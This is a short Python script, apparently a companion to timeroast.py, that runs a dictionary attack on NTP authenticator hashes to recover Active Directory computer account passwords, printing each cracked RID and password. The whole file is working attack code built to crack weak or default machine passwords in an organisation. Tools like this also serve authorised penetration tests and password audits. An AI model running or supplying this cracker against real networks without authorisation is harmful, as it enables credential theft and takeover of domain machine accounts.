#!/usr/bin/env python3

"""Perform a simple dictionary attack against the output of timeroast.py. Neccessary because the NTP 'hash' format 
unfortunately does not fit into Hashcat or John right now.

Not even remotely optimized, but still useful for cracking legacy default passwords (where the password is the computer 
name) or specific default passwords that are popular in an organisation.
"""

from binascii import hexlify, unhexlify
from argparse import ArgumentParser, FileType, RawDescriptionHelpFormatter
import hashlib, sys

def compute_hash(password, salt):
  """Compute a legacy NTP authenticator 'hash'."""
  return hashlib.md5(hashlib.new('md4', password.encode('utf-16le')).digest() + salt).digest()

def try_crack(hashfile, dictfile):
  # Try each dictionary entry for each hash. dictfile is read iteratively while hashfile is stored in RAM.
  hashes = [line.strip().split(':', 3) for line in hashfile if line.strip()]
  hashes = [(int(rid), unhexlify(hashval), unhexlify(salt)) for [rid, hashval, salt] in hashes]
  for password in dictfile:
    password = password.strip()
    for rid, hashval, salt in hashes:
      if compute_hash(password, salt) == hashval:
        yield rid, password

def main():
  argparser = ArgumentParser(formatter_class=RawDescriptionHelpFormatter, description=\
"""Perform a simple dictionary attack against the output of timeroast.py. 
Neccessary because the NTP 'hash' format unfortunately does not fit into Hashcat
or John right now.

Not even remotely optimized, but still useful for cracking legacy default 
passwords (where the password is the computer name) or specific default 
passwords that are popular in an organisation.
""")

  argparser.add_argument('hashes', type=FileType('r'), help='Output of timeroast.py')
  argparser.add_argument('dictionary', type=FileType('r'), help='Line-delimited password dictionary')
  args = argparser.parse_args()

  crackcount = 0
  for rid, password in try_crack(args.hashes, args.dictionary):
    print(f'[+] Cracked RID {rid} password: {password}')
    crackcount += 1

  print(f'\n{crackcount} passwords recovered.')

if __name__ == '__main__':
  main()


